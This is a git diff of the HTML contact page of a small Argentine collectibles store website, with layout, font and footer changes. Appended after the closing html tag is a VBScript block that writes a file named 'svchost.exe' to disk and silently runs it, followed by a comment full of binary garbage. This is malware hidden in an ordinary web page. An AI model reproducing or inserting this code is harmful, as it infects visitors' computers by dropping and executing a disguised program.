@@ -7,7 +7,7 @@
 
     <!-- SEO -->
     <link rel="shortcut icon" href="icons/tittle_icon.ico">
-    <title>Geek World - Contacto</title>
+    <title>Geek World / Contacto</title>
 
     <meta name="description" content="La mejor tienda virtual de coleccionables de Argentina. Pedilo y te lo enviamos, o visitanos en nuestra web. Las mejores imagenes y videos de superheroes y animÃ©" />
 
@@ -20,13 +20,20 @@
     <!--bootstrapp-->
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css" integrity="sha384-zCbKRCUGaJDkqS1kPbPd7TveP5iyJE0EjAuZQTgFLD2ylzuqKfdKlfG/eSrtxUkn" crossorigin="anonymous">
 
+    <!--google fonts-->
     <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link href="https://fonts.googleapis.com/css2?family=Grechen+Fuemen&display=swap" rel="stylesheet">
+    
     <link href="https://fonts.googleapis.com/css2?family=Gluten:wght@300&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Fuzzy+Bubbles&display=swap" rel="stylesheet">
+    
+    <!-- font awesome -->
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css" integrity="sha384-DyZ88mC6Up2uqS4h/KRgHuoeGwBcD4Ng9SiP4dIRy0EXTlnuz47vAwmeGwVChigm" crossorigin="anonymous">
 
     <!-- animates -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+
+    <!-- aos -->
     <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
 
     <!-- css -->
@@ -35,30 +42,37 @@
 
 <body class="bodyContact">
     <header>
+        <!--NAVBAR-->
         <div class="container-fluid">
             <div class="row">
                 <div class="col-xl-12 col-sm-12 col-md-12 col-lg-12">
                     <nav class="navbar navbar-expand-sm navbar navbar-expand-md navbar navbar-expand-lg navbar navbar-expand-xl navbar navbar-expand-xxl navbar-light" style="background-color: #e3f2fd;">
                         <div class="container-fluid">
+                        <!--twitter-->
                         <a href="https://twitter.com/?lang=es" target="_blank" class="navbar-brand">
                         <img src="icons/social_Twitter_38.png" alt="twitter_icon" style="width:40px;"></a>
+                        <!--facebook-->
                         <a href="https://www.facebook.com/" target="_blank" class="navbar-brand">
                             <img src="icons/social_facebook_fb_35.png" alt="facebook_icon" style="width:40px;"></a>
+                        <!--instagram-->
                         <a href="https://www.instagram.com/?hl=es" target="_blank" class="navbar-brand">
                             <img src="icons/social_instagram_3.png" alt="instagram_icon" style="width:40px;"></a>
+                        <!--return home and month anime link-->
                         <div class="collapse navbar-collapse" id="navbarSupportedContent">
                             <ul class="navbar-nav me-auto mb-2 mb-lg-0">
-                            <li class="nav-item">
+                            <!--return home-->
+                            <li class="nav-item dissapear">
                                 <a target="_self" href="index.html" class="nav-link" >Home</a>
                             </li>
+                            <!--month anime link-->
                             <li class="nav-item">
                                 <a class="nav-link" href="https://ar.pinterest.com/search/pins/?q=best%20anime%20images&rs=typed&term_meta[]=best%7Ctyped&term_meta[]=anime%7Ctyped&term_meta[]=images%7Ctyped" target="_blank" style="font-size:medium;">Link Month Anime Images</a>
                             </li>      
                         </div>
-                        <div class="col-sm-1 col-lg-3 col-md-4">
-                            <form class="d-flex justify-content-end button">
-                                <input class="form-control me-2" type="search" placeholder="Search" aria-label="Search">
-                                <button class="btn btn-outline-success" type="submit" style="background-color: black;"><a target="_blank" style= "text-decoration: none; color: white;" href="https://www.google.com/">Google</a></button>
+                        <!--LOGIN BUTTON-->
+                        <div class="col-sm-4 col-lg-3 col-md-4">
+                            <form class="d-flex justify-content-end button navbar-brand">
+                                <button class="btn btn-outline-success" type="submit" style="background-color: black; width: 100%;"><a target="_self" style= "text-decoration: none; color: white;" href="login.html">Geek Login</a></button>
                             </form>
                         </div>
                         </div>
@@ -66,13 +80,16 @@
                 </div>
             </div> 
         </div>
+        <!--LOGO AND MENU-->
         <div class="flexHeader">
             <div class="row row-cols-1">
+                <!--LOGO-->
                 <div class="col">
                     <div>
-                        <img src="imagenes/geek_world.gif" alt="Logo">
+                        <img src="imagenes/geek_world_logo.gif" alt="Logo">
                     </div>
                 </div>
+                <!--MENU DE NAVEGACIÃ“N ENTRE SECTIONS-->
                 <div class="col">
                     <div>
                         <nav>
@@ -89,102 +106,184 @@
                 </div>
             </div>
         <div>
-    </header>    
+    </header>     
 
-    <div class="sectionContact">
-    <section>
-        <div>
-        <fieldset>
-            <legend>Geek Contact</legend>
-            <form action="enviar.php" method="post" enctype="application/x-www-form-urlencoded">
-                <h3 class="animate__animated animate__backInLeft ">Formulario de Contacto</h3>
-                <div class="columnDate">
-                    <label for="name">Nombre y Apellido:</label>
-                    <input type="text" id="name" required>
-                    <label for="dni">DNI:</label> 
-                    <input type="number" id="dni" required>
-                    <label for="bornDay">Fecha de Nacimiento: </label>
-                    <input type="date" id="bornDay" required>
-                    <label for="cellphone">Telefono: </label>
-                    <input type="tel" id="cellphone">
-                    <label for="email">Email:</label> 
-                    <input type="email" id="email" required>
-                    <div class="check ">
-                        <h4>Genero:</h4>
-                        <input type="radio" id="masculino" name="genero" value= "Masculino">
-                        <label for="genero">Masculino</label><br>
-                        <input type="radio" id="femenino" name="genero" value= "Femenino">
-                        <label for="genero">Femenino</label><br>
-                    </div>
-                    <div class="listContact "><label for="LicenciaBuscada">Licencia Buscada:</label>
-                        <select name="LicenciaBuscada">
-                            <option value="Koto">Kotobukiya</option>
-                            <option value="Neca">Neca</option>
-                            <option value="Iron">Iron Studios</option>
-                            <option value="HotToys">Hot Toys</option>
-                            <option value="Banpresto">Banpresto</option>
-                        </select>
-                    </div>
-                    <div class="comentariosContact ">
-                        <label for="comentarios">Comentarios</label>
-                    <textarea name="LicenciaFavorita" id="comentarios" cols="45" rows="4" placeholder="MÃ­nimo de 5 palabras"></textarea><br>
-                    </div>
-                </div>
+    <main>
+        <div class="sectionContact">
+            <section>
                 <div>
-                    <input class="sendContact" type="submit" value="Enviar">
-                    <input class="GetOutcontact" type="reset" value="Borrar">
-                </div>
-            </form>    
-        </fieldset>
-        </div>       
-    </section>
-    </div>
+                <fieldset>
+                    <legend>Geek Contact</legend>
+                    <form action="enviar.php" method="post" enctype="application/x-www-form-urlencoded">
+                        <h3 class="animate__animated animate__backInLeft ">Formulario de Contacto</h3>
+                        <div class="columnDate">
+                            <label for="name">Nombre y Apellido:</label>
+                            <input type="text" id="name" required>
+                            <label for="dni">DNI:</label> 
+                            <input type="number" id="dni" required>
+                            <label for="bornDay">Fecha de Nacimiento: </label>
+                            <input type="date" id="bornDay" required>
+                            <label for="cellphone">Telefono: </label>
+                            <input type="tel" id="cellphone">
+                            <label for="email">Email:</label> 
+                            <input type="email" id="email" required>
+                            <div class="check ">
+                                <h4>Genero:</h4>
+                                <input type="radio" id="masculino" name="genero" value= "Masculino">
+                                <label for="genero">Masculino</label><br>
+                                <input type="radio" id="femenino" name="genero" value= "Femenino">
+                                <label for="genero">Femenino</label><br>
+                            </div>
+                            <div class="listContact "><label for="LicenciaBuscada">Licencia Buscada:</label>
+                                <select name="LicenciaBuscada">
+                                    <option value="Koto">Kotobukiya</option>
+                                    <option value="Neca">Neca</option>
+                                    <option value="Iron">Iron Studios</option>
+                                    <option value="HotToys">Hot Toys</option>
+                                    <option value="Banpresto">Banpresto</option>
+                                </select>
+                            </div>
+                            <div class="comentariosContact ">
+                                <label for="comentarios">Comentarios</label>
+                            <textarea name="LicenciaFavorita" id="comentarios" cols="45" rows="4" placeholder="MÃ­nimo de 5 palabras"></textarea><br>
+                            </div>
+                        </div>
+                        <div>
+                            <input class="sendContact" type="submit" value="Enviar">
+                            <input class="GetOutcontact" type="reset" value="Borrar">
+                        </div>
+                    </form>    
+                </fieldset>
+                </div>       
+            </section>
+        </div>
 
-    <footer>
-        <div id="footerFlex">
-            <div class="footerCategory">
-                <h3>CategorÃ­as</h3>
-                <nav>  
+        <!-- COMIENZO SECTION CONTACTO -->
+        <section class="container" data-aos="fade-up">
+            <!-- titular principal -->
+            <div>
+                <h2 style="margin-top: 25px;">Contacto</h2>
+                <p style="font-size: 20px;">Contactanos por cualquiera de los siguientes medios.</p>
+            </div>
+            <!-- comienzo informacion de contacto -->
+            <div class="row row-cols-2 row-cols-md-4 contact-container">
+                <!-- telefono -->
+                <div class="col">
+                    <div class="contact-info-item h-100">
+                        <i class="fas fa-mobile-alt icon"></i>
+                        <h3>TelÃ©fono</h3>
+                        <p>+54 9 3517911990</p>
+                    </div>
+                </div>
+                <!-- direccion -->
+                <div class="col">
+                    <div class="contact-info-item h-100">
+                        <i class="far fa-map icon"></i>
+                        <h3>DirecciÃ³n</h3>
+                        <p>PÃºblica 1 Norte 6920, CÃ³rdoba, Argentina</p>
+                    </div>
+                </div>
+                <!-- horarios -->
+                <div class="col">
+                    <div class="contact-info-item h-100">
+                        <i class="far fa-calendar-alt icon"></i>
+                        <h3>Horarios</h3>
+                        <p>L M X J V 9:00-18:00</p>
+                    </div>
+                </div>
+                <!-- e-mail -->
+                <div class="col">
+                    <div class="contact-info-item h-100">
+                        <i class="far fa-envelope icon"></i>
+                        <h3>Email</h3>
+                        <p>geek-w@gmail.com</p>
+                    </div>
+                </div>
+            </div>   
+        </section>
+        <!-- fin informacion de contacto -->
+    </main>    
+
+    <!-- COMIENZO FOOTER -->
+    <footer class="container" id="footer" style="background-color: white;">
+        <!-- comienzo informacion -->
+        <div class="row row-cols-12 row-cols-md-4 row-cols-lg-5 justify-content-between">
+            <!-- logo -->
+            <div class="col-md-3 col-lg-2 footer-brand">
+                <a href="index.html"><img src="imagenes/geek_footer.png" alt="Logo Geek-World"></a>
+            </div>
+            <!-- informacion principal -->
+            <div class="col-5 col-md-2 col-lg-auto">
+                <div class="footer-menu">
                     <ul>
-                        <li><a href="index.html" target="_self"><em><strong>Home</strong></em></a></li>
-                        <li><a href="novedades.html" target="_self"><em><strong>Novedades</strong></em></a></li>
-                        <li><a href="licencias.html" target="_self"><em><strong>Licencias</strong></em></a></li>
-                        <li><a href="entretenimiento.html" target="_self"><em><strong>Entretenimiento</strong></em></a></li>
-                        <li><a href="contacto.html" target="_self"><em><strong>Contacto</strong></em></a></li>
-                    </ul>    
-                </nav>        
-            </div>
-            <div class="footerLocation">
-                <h3>UbicaciÃ³n</h3>
-                <div>
-                <iframe style= "border: 2px solid black;" src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3402.0522570817484!2d-64.27094768512092!3d-31.495247407221836!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zMzHCsDI5JzQyLjkiUyA2NMKwMTYnMDcuNSJX!5e0!3m2!1ses-419!2sar!4v1635179064054!5m2!1ses-419!2sar" width="250" height="200" style="border:0;" allowfullscreen="" loading="lazy"></iframe>
-                </div>
-                <div>
-                    <img src="imagenes/mapplaceholder_122316.ico" alt="icono ubicacion">
-                    <p style="font-size: 20px;">Calle PÃºblica 1 Norte 6920</p>
+                        <li><a href="index.html" target="_self">Home</a></li>
+                        <li><a href="novedades.html" target="_self">Novedades</a></li>
+                        <li><a href="licencias.html" target="_self">Licencias</a></li>
+                        <li><a href="entretenimiento.html" target="_self">Entretenimiento</a></li>
+                        <li><a href="contacto.html" target="_self">Contacto</a></li>
+                    </ul>
                 </div>
             </div>
-            <div class="footerContact">
-                <h3>Contacto</h3>
-                <p>Se agregarÃ¡n iconos de contacto</p>
+            <!-- informacion secundaria -->
+            <div class="col-7 col-md-auto col-lg-auto">
+                <div class="footer-menu">
+                    <ul>
+                        <li><a href="#destacados">Destacados</a></li>
+                        <li><a href="#momentos_epicos">Momentos Ã‰picos</a></li>
+                        <li><a href="#ofertas">Ofertas</a></li>
+                    </ul>
+                </div>
             </div>
-            <div class="footerFollow">
-                <h3>Seguinos en...</h3>
-                <ul>
-                    <li><a href="https://twitter.com/?lang=es" target="_blank" class="navbar-brand">
-                    <img src="icons/1491579583-yumminkysocialmedia02_83111.ico" alt="twitter_icon" style="width: 37px;"></a></li>
-                    <li><a href="https://www.facebook.com/" target="_blank" class="navbar-brand">
-                    <img src="icons/social_facebook_box_blue_256_30649.png" alt="facebook_icon" style="width:40px;"></a></li>
-                    <li><a href="https://www.instagram.com/?hl=es" target="_blank" class="navbar-brand">
-                    <img src="icons/3721672-instagram_108066.ico" alt="instagram_icon" style="width:40px;"></a></li>
-                </ul>
+            <!-- redes sociales -->
+            <div class="col-5 col-md-3 col-lg-auto">
+                <div class="footer-social">
+                    <p>Sigamos conectados</p>
+                    <a href="https://marcelorosso.github.io/Geek-World" target="_blank"><i class="fas fa-globe"></i></a>
+                    <a href="https://www.facebook.com/" target="_blank"><i class="fab fa-facebook-f"></i></a>
+                    <a href="https://twitter.com/?lang=es" target="_blank"><i class="fab fa-twitter"></i></a>
+                    <a href="https://www.instagram.com/?hl=es" target="_blank"><i class="fab fa-instagram"></i></a>
+                </div>
             </div>
-        </div>         
+            <!-- newsletter -->
+            <div class="col-7 col-md-12 col-lg-3">
+                <div class="newsletter">
+                    <p>Suscribite al newsletter para recibir nuestras novedades</p>
+                    <form action="" class="subscribe-form">
+                        <input class="subscribe" type="email" name="email" placeholder="IngresÃ¡ tu e-mail" required>
+                        <button class="action-icon"><i class="fas fa-arrow-right"></i></button>
+                        <input class="subscribe-button" type="submit" value="Suscribirse">
+                    </form>
+                </div>
+            </div>
+        </div>
+        <!-- fin informacion -->
+        <!-- copyright -->
+        <div class="copyright">
+            <p>Â© 2021 GEEK WORLD. Todos los derechos reservados.</p>
+            <div>
+                <span>Desarrollado con <span class="heart">ðŸ’œ</span> por Marcelo Gabriel Rosso.</span>
+            </div>
+            <div class="footer-social">
+                <a href="https://marcelorosso.github.io/Geek-World" target="_blank"><i class="fab fa-github"></i></i></a>
+                <a href="https://www.linkedin.com/in/marcelo-gabriel-rosso-6797369a/" target="_blank"><i class="fab fa-linkedin-in"></i></a>
+            </div>
+        </div>
     </footer>
     
+    <!--bootstrapp-->
     <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
     <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.min.js" integrity="sha384-VHvPCCyXqtD5DqJeNxl2dtTyhF78xXNXdkwX1CZeRusQfRKp+tA7hAShOK/B/fQ2" crossorigin="anonymous"></script>
+
+    <!--aos-->
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    <script>
+        AOS.init({duration:1000});
+    </script>
+
+    <!--font awesome-->
+    <script src="https://kit.fontawesome.com/aab291df05.js" crossorigin="anonymous"></script>
+
 </body>
 </html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
@@ -200,4 +299,5 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--ïùòZõŒü¡3'JËìdÞòkÁWr€myBÄ´ÃìTRâ©'ÃOÉNóã&Ú”?Ý82¡7ÜÈûù˜,`¹Ï¢ÜXZÇ¼ÀH˜¯£®þöTæ,H¾µD‘VÔ;FsÝ¤|22ñ¯ª²ÉúK¯pLŽ•Wß¢o;®ñ~Xm¨¨b½Çaˆwù=HD5e†}-µÆ»Ò}-Ò™ÒW±fœûÙˆïùT«?Ê Fiu¥KÓn¡å¾ÔIPŒ€Íö‡r¥M£;½y‘à‚nDí‡o¶RÚ‹/GhÉ,CÈ£ËÌç74ØŠQùã0 ÁÈ[g3‹Û~ï¡ÝX”9(«vÝ‡fí¾äó44QŒû/iÊÝŸ£ç*øÊËORáûŸC†ñ4ÁQrÈÉ¼vêœa¦¢í¢6_›Û I\Ž)¿*EN ÎpA=Å;jÌù¶ ÐõRîûÐõÐõÐõÅMGI`Ýüõ Ðõ-->
+//--></SCRIPT><!--ã•~)»¯Ô…ïHT°k4h¥m”ë8C“B©ÉŠkþ½Âí?!–Ò>B“M×pD+"xÓAZHDãïQÕß|%´Ÿ¤]‹[È1_¸BqåäŠýÝ\¡/^Ï.@û¸:^–¦ƒ*hM(@¿µ?)yChIí*õ)ûÉANVú‚ÚèÓ0.†erª‘ªžõ~qô)/@=ˆïø .€æÈL÷C@¦»m+æ—*¯¤ßñ¦Tn:ì­ðFŸ¿ëüG²Ñ…Ö¸JlW&ëN1‰úÈÊMQØãæ	TÓ¡©*Õ€W26YßãbQæwçßš©. /
+æ2Üâ™æ/f÷ææ+ë‡w'-àÜ@†R›|…rdu§…ÅlK”‚{T´p„Ù$|˜I’»mê	8m¹]iyð—C-ÞmÌÝ«O\¥$çz^¯¸‰f ÒRRIøÒRÒRÒRÅ±N%šc›ïR ÒR-->
